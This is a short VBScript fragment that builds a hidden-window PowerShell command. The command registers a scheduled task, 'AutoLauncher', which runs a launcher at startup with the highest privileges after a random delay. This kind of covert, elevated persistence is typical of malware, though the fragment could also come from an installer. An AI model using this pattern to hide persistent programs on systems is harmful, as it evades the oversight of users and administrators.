...
psCommand = "powershell.exe -WindowStyle Hidden -Command """ & _
    "$action = New-ScheduledTaskAction -Execute '" & launcherPath & "'; " & _
    "$trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay 00:00:30; " & _
    "Register-ScheduledTask -TaskName AutoLauncher -Action $action -Trigger $trigger -RunLevel Highest -Force"""
